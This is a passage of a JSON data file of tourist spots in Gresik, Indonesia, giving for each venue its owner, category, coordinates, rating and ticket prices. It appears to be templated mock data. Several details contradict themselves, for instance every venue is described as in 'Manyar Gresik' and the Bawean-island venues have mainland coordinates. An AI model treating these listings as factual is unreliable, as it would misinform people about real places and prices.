                "image": "https://images.unsplash.com/photo-1565557623262-b51c2513a641?auto=format&fit=crop&w=600&q=80",
                "description": "Warung makan tradisional khas menyajikan menu sego ruwet yang berada di kawasan strategis Kecamatan Cerme, Gresik.",
                "coords": [
                    -7.189083,
                    112.588317
                ],
                "rating": 4.3,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c225_1",
                        "name": "Tiket / Menu Layanan Sego Ruwet",
                        "price": 20000,
                        "description": "Akses menikmati layanan berkualitas premium di Sego Ruwet Manyar Gresik."
                    },
                    {
                        "id": "c225_2",
                        "name": "Paket Premium Sego Ruwet",
                        "price": 60000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m226",
                "name": "Bukit Kapur Benjeng",
                "owner": "Cak Mega",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1501785888041-af3ef285b470?auto=format&fit=crop&w=600&q=80",
                "description": "Keindahan panorama alam tersembunyi berupa bukit kapur yang berada di kawasan strategis Kecamatan Benjeng, Gresik.",
                "coords": [
                    -7.381405,
                    112.573263
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c226_1",
                        "name": "Tiket / Menu Layanan Bukit Kapur",
                        "price": 20000,
                        "description": "Akses menikmati layanan berkualitas premium di Bukit Kapur Manyar Gresik."
                    },
                    {
                        "id": "c226_2",
                        "name": "Paket Premium Bukit Kapur",
                        "price": 55000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m227",
                "name": "Sentra Zikir Balongpanggang",
                "owner": "Cak Cak",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1584551246679-0daf3d275d0f?auto=format&fit=crop&w=600&q=80",
                "description": "Situs sakral tempat beribadah dan ziarah agung sentra zikir yang berada di kawasan strategis Kecamatan Balongpanggang, Gresik.",
                "coords": [
                    -7.075558,
                    112.750419
                ],
                "rating": 4.9,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c227_1",
                        "name": "Tiket / Menu Layanan Sentra Zikir",
                        "price": 5000,
                        "description": "Akses menikmati layanan berkualitas premium di Sentra Zikir Manyar Gresik."
                    },
                    {
                        "id": "c227_2",
                        "name": "Paket Premium Sentra Zikir",
                        "price": 30000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m228",
                "name": "Monumen Perjuangan Duduksampeyan",
                "owner": "Cak Mak",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?auto=format&fit=crop&w=600&q=80",
                "description": "Bangunan bersejarah peninggalan purbakala berupa monumen perjuangan yang berada di kawasan strategis Kecamatan Duduksampeyan, Gresik.",
                "coords": [
                    -7.173358,
                    112.651572
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c228_1",
                        "name": "Tiket / Menu Layanan Monumen Perjuangan",
                        "price": 15000,
                        "description": "Akses menikmati layanan berkualitas premium di Monumen Perjuangan Manyar Gresik."
                    },
                    {
                        "id": "c228_2",
                        "name": "Paket Premium Monumen Perjuangan",
                        "price": 30000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m229",
                "name": "Sentra Tenun Sarung Wringinanom",
                "owner": "Cak Haji",
                "type": "belanja",
                "image": "https://images.unsplash.com/photo-1505253716362-afaea1d3d1af?auto=format&fit=crop&w=600&q=80",
                "description": "Sentra perdagangan belanja produk unggulan lokal berupa sentra tenun sarung yang berada di kawasan strategis Kecamatan Wringinanom, Gresik.",
                "coords": [
                    -7.297734,
                    112.632166
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c229_1",
                        "name": "Tiket / Menu Layanan Sentra Tenun Sarung",
                        "price": 5000,
                        "description": "Akses menikmati layanan berkualitas premium di Sentra Tenun Sarung Manyar Gresik."
                    },
                    {
                        "id": "c229_2",
                        "name": "Paket Premium Sentra Tenun Sarung",
                        "price": 35000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m230",
                "name": "Taman Bunga Indah Driyorejo",
                "owner": "Cak Neng",
                "type": "rekreasi",
                "image": "https://images.unsplash.com/photo-1501785888041-af3ef285b470?auto=format&fit=crop&w=600&q=80",
                "description": "Wahana bermain dan rekreasi keluarga terpadu berupa taman bunga indah yang berada di kawasan strategis Kecamatan Driyorejo, Gresik.",
                "coords": [
                    -7.06144,
                    112.623475
                ],
                "rating": 4.4,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c230_1",
                        "name": "Tiket / Menu Layanan Taman Bunga Indah",
                        "price": 15000,
                        "description": "Akses menikmati layanan berkualitas premium di Taman Bunga Indah Manyar Gresik."
                    },
                    {
                        "id": "c230_2",
                        "name": "Paket Premium Taman Bunga Indah",
                        "price": 40000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m231",
                "name": "Kerajinan Lampion Damar Kurung Kedamean",
                "owner": "Cak Warkop",
                "type": "budaya",
                "image": "https://images.unsplash.com/photo-1516450360452-9312f5e86fc7?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat pelestarian warisan budaya kesenian leluhur berupa kerajinan lampion damar kurung yang berada di kawasan strategis Kecamatan Kedamean, Gresik.",
                "coords": [
                    -7.062479,
                    112.714922
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c231_1",
                        "name": "Tiket / Menu Layanan Kerajinan Lampion Damar Kurung",
                        "price": 20000,
                        "description": "Akses menikmati layanan berkualitas premium di Kerajinan Lampion Damar Kurung Manyar Gresik."
                    },
                    {
                        "id": "c231_2",
                        "name": "Paket Premium Kerajinan Lampion Damar Kurung",
                        "price": 60000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m232",
                "name": "Kebun Nanas Madu Menganti",
                "owner": "Cak Sejarah",
                "type": "edukasi",
                "image": "https://images.unsplash.com/photo-1448375240586-882707db888b?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat riset dan pembelajaran edukatif lapangan berupa kebun nanas madu yang berada di kawasan strategis Kecamatan Menganti, Gresik.",
                "coords": [
                    -7.362906,
                    112.594039
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c232_1",
                        "name": "Tiket / Menu Layanan Kebun Nanas Madu",
                        "price": 15000,
                        "description": "Akses menikmati layanan berkualitas premium di Kebun Nanas Madu Manyar Gresik."
                    },
                    {
                        "id": "c232_2",
                        "name": "Paket Premium Kebun Nanas Madu",
                        "price": 25000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m233",
                "name": "Es Dawet Siwalan Sidayu",
                "owner": "Cak Keluarga",
                "type": "kuliner",
                "image": "https://images.unsplash.com/photo-1565557623262-b51c2513a641?auto=format&fit=crop&w=600&q=80",
                "description": "Warung makan tradisional khas menyajikan menu es dawet siwalan yang berada di kawasan strategis Kecamatan Sidayu, Gresik.",
                "coords": [
                    -7.071351,
                    112.637569
                ],
                "rating": 5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c233_1",
                        "name": "Tiket / Menu Layanan Es Dawet Siwalan",
                        "price": 15000,
                        "description": "Akses menikmati layanan berkualitas premium di Es Dawet Siwalan Manyar Gresik."
                    },
                    {
                        "id": "c233_2",
                        "name": "Paket Premium Es Dawet Siwalan",
                        "price": 50000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m234",
                "name": "Puncak Awan Ujungpangkah",
                "owner": "Cak Backpacker",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1470071459604-3b5ec3a7fe05?auto=format&fit=crop&w=600&q=80",
                "description": "Keindahan panorama alam tersembunyi berupa puncak awan yang berada di kawasan strategis Kecamatan Ujungpangkah, Gresik.",
                "coords": [
                    -7.159008,
                    112.69061
                ],
                "rating": 4.3,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c234_1",
                        "name": "Tiket / Menu Layanan Puncak Awan",
                        "price": 15000,
                        "description": "Akses menikmati layanan berkualitas premium di Puncak Awan Manyar Gresik."
                    },
                    {
                        "id": "c234_2",
                        "name": "Paket Premium Puncak Awan",
                        "price": 35000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m235",
                "name": "Makam Bupati Panceng",
                "owner": "Cak Kulineran",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1584551246679-0daf3d275d0f?auto=format&fit=crop&w=600&q=80",
                "description": "Situs sakral tempat beribadah dan ziarah agung makam bupati yang berada di kawasan strategis Kecamatan Panceng, Gresik.",
                "coords": [
                    -7.267242,
                    112.744575
                ],
                "rating": 4.3,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c235_1",
                        "name": "Tiket / Menu Layanan Makam Bupati",
                        "price": 10000,
                        "description": "Akses menikmati layanan berkualitas premium di Makam Bupati Manyar Gresik."
                    },
                    {
                        "id": "c235_2",
                        "name": "Paket Premium Makam Bupati",
                        "price": 25000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m236",
                "name": "Makam Kuno Adipati Bungah",
                "owner": "Cak Gresik",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?auto=format&fit=crop&w=600&q=80",
                "description": "Bangunan bersejarah peninggalan purbakala berupa makam kuno adipati yang berada di kawasan strategis Kecamatan Bungah, Gresik.",
                "coords": [
                    -7.08222,
                    112.642671
                ],
                "rating": 4.3,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c236_1",
                        "name": "Tiket / Menu Layanan Makam Kuno Adipati",
                        "price": 10000,
                        "description": "Akses menikmati layanan berkualitas premium di Makam Kuno Adipati Manyar Gresik."
                    },
                    {
                        "id": "c236_2",
                        "name": "Paket Premium Makam Kuno Adipati",
                        "price": 60000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m237",
                "name": "Batik Goyor ATBM Tambak Bawean",
                "owner": "Cak AlunAlun",
                "type": "belanja",
                "image": "https://images.unsplash.com/photo-1505253716362-afaea1d3d1af?auto=format&fit=crop&w=600&q=80",
                "description": "Sentra perdagangan belanja produk unggulan lokal berupa batik goyor atbm yang berada di kawasan strategis Kecamatan Tambak Bawean, Gresik.",
                "coords": [
                    -7.134933,
                    112.74686
                ],
                "rating": 4.9,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c237_1",
                        "name": "Tiket / Menu Layanan Batik Goyor ATBM",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Batik Goyor ATBM Manyar Gresik."
                    },
                    {
                        "id": "c237_2",
                        "name": "Paket Premium Batik Goyor ATBM",
                        "price": 35000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m238",
                "name": "Taman Kota Bertingkat Sangkapura Bawean",
                "owner": "Cak Ziarah",
                "type": "rekreasi",
                "image": "https://images.unsplash.com/photo-1544735716-392fe2489ffa?auto=format&fit=crop&w=600&q=80",
                "description": "Wahana bermain dan rekreasi keluarga terpadu berupa taman kota bertingkat yang berada di kawasan strategis Kecamatan Sangkapura Bawean, Gresik.",
                "coords": [
                    -7.328002,
                    112.665642
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c238_1",
                        "name": "Tiket / Menu Layanan Taman Kota Bertingkat",
                        "price": 5000,
                        "description": "Akses menikmati layanan berkualitas premium di Taman Kota Bertingkat Manyar Gresik."
                    },
                    {
                        "id": "c238_2",
                        "name": "Paket Premium Taman Kota Bertingkat",
                        "price": 45000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m239",
                "name": "Teater Rakyat Gresik Kebomas",
                "owner": "Cak Sidayu",
                "type": "budaya",
                "image": "https://images.unsplash.com/photo-1534447677768-be436bb09401?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat pelestarian warisan budaya kesenian leluhur berupa teater rakyat gresik yang berada di kawasan strategis Kecamatan Kebomas, Gresik.",
                "coords": [
                    -7.068584,
                    112.601973
                ],
                "rating": 4.3,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c239_1",
                        "name": "Tiket / Menu Layanan Teater Rakyat Gresik",
                        "price": 10000,
                        "description": "Akses menikmati layanan berkualitas premium di Teater Rakyat Gresik Manyar Gresik."
                    },
                    {
                        "id": "c239_2",
                        "name": "Paket Premium Teater Rakyat Gresik",
                        "price": 60000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m240",
                "name": "Pusat Karang Bawean Manyar",
                "owner": "Cak Bawean",
                "type": "edukasi",
                "image": "https://images.unsplash.com/photo-1497633762265-9d179a990aa6?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat riset dan pembelajaran edukatif lapangan berupa pusat karang bawean yang berada di kawasan strategis Kecamatan Manyar, Gresik.",
                "coords": [
                    -7.137712,
                    112.700929
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c240_1",
                        "name": "Tiket / Menu Layanan Pusat Karang Bawean",
                        "price": 20000,
                        "description": "Akses menikmati layanan berkualitas premium di Pusat Karang Bawean Manyar Gresik."
                    },
                    {
                        "id": "c240_2",
                        "name": "Paket Premium Pusat Karang Bawean",
                        "price": 40000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m241",
                "name": "Sego Ruwet Gresik Kota",
                "owner": "Cak Ahmad",
                "type": "kuliner",
                "image": "https://images.unsplash.com/photo-1565557623262-b51c2513a641?auto=format&fit=crop&w=600&q=80",
                "description": "Warung makan tradisional khas menyajikan menu sego ruwet yang berada di kawasan strategis Kecamatan Gresik Kota, Gresik.",
                "coords": [
                    -7.296515,
                    112.752154
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c241_1",
                        "name": "Tiket / Menu Layanan Sego Ruwet",
                        "price": 5000,
                        "description": "Akses menikmati layanan berkualitas premium di Sego Ruwet Manyar Gresik."
                    },
                    {
                        "id": "c241_2",
                        "name": "Paket Premium Sego Ruwet",
                        "price": 25000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m242",
                "name": "Bukit Kapur Cerme",
                "owner": "Cak Budi",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1464822759023-fed622ff2c3b?auto=format&fit=crop&w=600&q=80",
                "description": "Keindahan panorama alam tersembunyi berupa bukit kapur yang berada di kawasan strategis Kecamatan Cerme, Gresik.",
                "coords": [
                    -7.236903,
                    112.566275
                ],
                "rating": 4.2,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c242_1",
                        "name": "Tiket / Menu Layanan Bukit Kapur",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Bukit Kapur Manyar Gresik."
                    },
                    {
                        "id": "c242_2",
                        "name": "Paket Premium Bukit Kapur",
                        "price": 40000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m243",
                "name": "Makam Syekh Benjeng",
                "owner": "Cak Lia",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1584551246679-0daf3d275d0f?auto=format&fit=crop&w=600&q=80",
                "description": "Situs sakral tempat beribadah dan ziarah agung makam syekh yang berada di kawasan strategis Kecamatan Benjeng, Gresik.",
                "coords": [
                    -7.201252,
                    112.628421
                ],
                "rating": 5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c243_1",
                        "name": "Tiket / Menu Layanan Makam Syekh",
                        "price": 30000,
                        "description": "Akses menikmati layanan berkualitas premium di Makam Syekh Manyar Gresik."
                    },
                    {
                        "id": "c243_2",
                        "name": "Paket Premium Makam Syekh",
                        "price": 60000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m244",
                "name": "Benteng Pertahanan Balongpanggang",
                "owner": "Cak Roni",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?auto=format&fit=crop&w=600&q=80",
                "description": "Bangunan bersejarah peninggalan purbakala berupa benteng pertahanan yang berada di kawasan strategis Kecamatan Balongpanggang, Gresik.",
                "coords": [
                    -7.288635,
                    112.702653
                ],
                "rating": 4.9,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c244_1",
                        "name": "Tiket / Menu Layanan Benteng Pertahanan",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Benteng Pertahanan Manyar Gresik."
                    },
                    {
                        "id": "c244_2",
                        "name": "Paket Premium Benteng Pertahanan",
                        "price": 25000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m245",
                "name": "Pengrajin Rebana Hadrah Duduksampeyan",
                "owner": "Cak Santi",
                "type": "belanja",
                "image": "https://images.unsplash.com/photo-1505253716362-afaea1d3d1af?auto=format&fit=crop&w=600&q=80",
                "description": "Sentra perdagangan belanja produk unggulan lokal berupa pengrajin rebana hadrah yang berada di kawasan strategis Kecamatan Duduksampeyan, Gresik.",
                "coords": [
                    -7.08455,
                    112.562459
                ],
                "rating": 4.2,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c245_1",
                        "name": "Tiket / Menu Layanan Pengrajin Rebana Hadrah",
                        "price": 30000,
                        "description": "Akses menikmati layanan berkualitas premium di Pengrajin Rebana Hadrah Manyar Gresik."
                    },
                    {
                        "id": "c245_2",
                        "name": "Paket Premium Pengrajin Rebana Hadrah",
                        "price": 25000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m246",
                "name": "Taman Pasir Bermain Wringinanom",
                "owner": "Cak Mega",
                "type": "rekreasi",
                "image": "https://images.unsplash.com/photo-1534438327276-14e5300c3a48?auto=format&fit=crop&w=600&q=80",
                "description": "Wahana bermain dan rekreasi keluarga terpadu berupa taman pasir bermain yang berada di kawasan strategis Kecamatan Wringinanom, Gresik.",
                "coords": [
                    -7.084938,
                    112.617155
                ],
                "rating": 4.9,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c246_1",
                        "name": "Tiket / Menu Layanan Taman Pasir Bermain",
                        "price": 30000,
                        "description": "Akses menikmati layanan berkualitas premium di Taman Pasir Bermain Manyar Gresik."
                    },
                    {
                        "id": "c246_2",
                        "name": "Paket Premium Taman Pasir Bermain",
                        "price": 50000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m247",
                "name": "Sanggar Tari Kembang Driyorejo",
                "owner": "Cak Cak",
                "type": "budaya",
                "image": "https://images.unsplash.com/photo-1589301760014-d929f3979dbc?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat pelestarian warisan budaya kesenian leluhur berupa sanggar tari kembang yang berada di kawasan strategis Kecamatan Driyorejo, Gresik.",
                "coords": [
                    -7.310146,
                    112.746199
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c247_1",
                        "name": "Tiket / Menu Layanan Sanggar Tari Kembang",
                        "price": 30000,
                        "description": "Akses menikmati layanan berkualitas premium di Sanggar Tari Kembang Manyar Gresik."
                    },
                    {
                        "id": "c247_2",
                        "name": "Paket Premium Sanggar Tari Kembang",
                        "price": 25000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m248",
                "name": "Pusat Lepas Tukik Kedamean",
                "owner": "Cak Mak",
                "type": "edukasi",
                "image": "https://images.unsplash.com/photo-1503676260728-1c00da094a0b?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat riset dan pembelajaran edukatif lapangan berupa pusat lepas tukik yang berada di kawasan strategis Kecamatan Kedamean, Gresik.",
                "coords": [
                    -7.163682,
                    112.673152
                ],
                "rating": 5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c248_1",
                        "name": "Tiket / Menu Layanan Pusat Lepas Tukik",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Pusat Lepas Tukik Manyar Gresik."
                    },
                    {
                        "id": "c248_2",
                        "name": "Paket Premium Pusat Lepas Tukik",
                        "price": 60000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m249",
                "name": "Es Dawet Siwalan Menganti",
                "owner": "Cak Haji",
                "type": "kuliner",
                "image": "https://images.unsplash.com/photo-1565557623262-b51c2513a641?auto=format&fit=crop&w=600&q=80",
                "description": "Warung makan tradisional khas menyajikan menu es dawet siwalan yang berada di kawasan strategis Kecamatan Menganti, Gresik.",
                "coords": [
                    -7.256552,
                    112.57833
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c249_1",
                        "name": "Tiket / Menu Layanan Es Dawet Siwalan",
                        "price": 10000,
                        "description": "Akses menikmati layanan berkualitas premium di Es Dawet Siwalan Manyar Gresik."
                    },
                    {
                        "id": "c249_2",
                        "name": "Paket Premium Es Dawet Siwalan",
                        "price": 25000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m250",
                "name": "Puncak Awan Sidayu",
                "owner": "Cak Neng",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1447752875215-b2761acb3c5d?auto=format&fit=crop&w=600&q=80",
                "description": "Keindahan panorama alam tersembunyi berupa puncak awan yang berada di kawasan strategis Kecamatan Sidayu, Gresik.",
                "coords": [
                    -7.404058,
                    112.741431
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c250_1",
                        "name": "Tiket / Menu Layanan Puncak Awan",
                        "price": 15000,
                        "description": "Akses menikmati layanan berkualitas premium di Puncak Awan Manyar Gresik."
                    },
                    {
                        "id": "c250_2",
                        "name": "Paket Premium Puncak Awan",
                        "price": 45000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m251",
                "name": "Sentra Zikir Ujungpangkah",
                "owner": "Cak Warkop",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1584551246679-0daf3d275d0f?auto=format&fit=crop&w=600&q=80",
                "description": "Situs sakral tempat beribadah dan ziarah agung sentra zikir yang berada di kawasan strategis Kecamatan Ujungpangkah, Gresik.",
                "coords": [
                    -7.185549,
                    112.615247
                ],
                "rating": 4.9,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c251_1",
                        "name": "Tiket / Menu Layanan Sentra Zikir",
                        "price": 30000,
                        "description": "Akses menikmati layanan berkualitas premium di Sentra Zikir Manyar Gresik."
                    },
                    {
                        "id": "c251_2",
                        "name": "Paket Premium Sentra Zikir",
                        "price": 35000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m252",
                "name": "Monumen Perjuangan Panceng",
                "owner": "Cak Sejarah",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?auto=format&fit=crop&w=600&q=80",
                "description": "Bangunan bersejarah peninggalan purbakala berupa monumen perjuangan yang berada di kawasan strategis Kecamatan Panceng, Gresik.",
                "coords": [
                    -7.069238,
                    112.755992
                ],
                "rating": 4.3,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c252_1",
                        "name": "Tiket / Menu Layanan Monumen Perjuangan",
                        "price": 15000,
                        "description": "Akses menikmati layanan berkualitas premium di Monumen Perjuangan Manyar Gresik."
                    },
                    {
                        "id": "c252_2",
                        "name": "Paket Premium Monumen Perjuangan",
                        "price": 45000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m253",
                "name": "Sentra Tenun Sarung Bungah",
                "owner": "Cak Keluarga",
                "type": "belanja",
                "image": "https://images.unsplash.com/photo-1505253716362-afaea1d3d1af?auto=format&fit=crop&w=600&q=80",
                "description": "Sentra perdagangan belanja produk unggulan lokal berupa sentra tenun sarung yang berada di kawasan strategis Kecamatan Bungah, Gresik.",
                "coords": [
                    -7.306524,
                    112.608245
                ],
                "rating": 4.3,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c253_1",
                        "name": "Tiket / Menu Layanan Sentra Tenun Sarung",
                        "price": 5000,
                        "description": "Akses menikmati layanan berkualitas premium di Sentra Tenun Sarung Manyar Gresik."
                    },
                    {
                        "id": "c253_2",
                        "name": "Paket Premium Sentra Tenun Sarung",
                        "price": 55000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m254",
                "name": "Taman Bunga Indah Tambak Bawean",
                "owner": "Cak Backpacker",
                "type": "rekreasi",
                "image": "https://images.unsplash.com/photo-1501785888041-af3ef285b470?auto=format&fit=crop&w=600&q=80",
                "description": "Wahana bermain dan rekreasi keluarga terpadu berupa taman bunga indah yang berada di kawasan strategis Kecamatan Tambak Bawean, Gresik.",
                "coords": [
                    -7.125194,
                    112.745473
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c254_1",
                        "name": "Tiket / Menu Layanan Taman Bunga Indah",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Taman Bunga Indah Manyar Gresik."
                    },
                    {
                        "id": "c254_2",
                        "name": "Paket Premium Taman Bunga Indah",
                        "price": 45000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m255",
                "name": "Kerajinan Lampion Damar Kurung Sangkapura Bawean",
                "owner": "Cak Kulineran",
                "type": "budaya",
                "image": "https://images.unsplash.com/photo-1516450360452-9312f5e86fc7?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat pelestarian warisan budaya kesenian leluhur berupa kerajinan lampion damar kurung yang berada di kawasan strategis Kecamatan Sangkapura Bawean, Gresik.",
                "coords": [
                    -7.22981,
                    112.697723
                ],
                "rating": 5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c255_1",
                        "name": "Tiket / Menu Layanan Kerajinan Lampion Damar Kurung",
                        "price": 5000,
                        "description": "Akses menikmati layanan berkualitas premium di Kerajinan Lampion Damar Kurung Manyar Gresik."
                    },
                    {
                        "id": "c255_2",
                        "name": "Paket Premium Kerajinan Lampion Damar Kurung",
                        "price": 55000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m256",
                "name": "Kebun Nanas Madu Kebomas",
                "owner": "Cak Gresik",
                "type": "edukasi",
                "image": "https://images.unsplash.com/photo-1448375240586-882707db888b?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat riset dan pembelajaran edukatif lapangan berupa kebun nanas madu yang berada di kawasan strategis Kecamatan Kebomas, Gresik.",
                "coords": [
                    -7.316373,
                    112.570372
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c256_1",
                        "name": "Tiket / Menu Layanan Kebun Nanas Madu",
                        "price": 10000,
                        "description": "Akses menikmati layanan berkualitas premium di Kebun Nanas Madu Manyar Gresik."
                    },
                    {
                        "id": "c256_2",
                        "name": "Paket Premium Kebun Nanas Madu",
                        "price": 50000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m257",
                "name": "Sego Ruwet Manyar",
                "owner": "Cak AlunAlun",
                "type": "kuliner",
                "image": "https://images.unsplash.com/photo-1565557623262-b51c2513a641?auto=format&fit=crop&w=600&q=80",
                "description": "Warung makan tradisional khas menyajikan menu sego ruwet yang berada di kawasan strategis Kecamatan Manyar, Gresik.",
                "coords": [
                    -7.188537,
                    112.750846
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c257_1",
                        "name": "Tiket / Menu Layanan Sego Ruwet",
                        "price": 30000,
                        "description": "Akses menikmati layanan berkualitas premium di Sego Ruwet Manyar Gresik."
                    },
                    {
                        "id": "c257_2",
                        "name": "Paket Premium Sego Ruwet",
                        "price": 55000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m258",
                "name": "Bukit Kapur Gresik Kota",
                "owner": "Cak Ziarah",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1472214222541-d510753a4707?auto=format&fit=crop&w=600&q=80",
                "description": "Keindahan panorama alam tersembunyi berupa bukit kapur yang berada di kawasan strategis Kecamatan Gresik Kota, Gresik.",
                "coords": [
                    -7.170811,
                    112.639237
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c258_1",
                        "name": "Tiket / Menu Layanan Bukit Kapur",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Bukit Kapur Manyar Gresik."
                    },
                    {
                        "id": "c258_2",
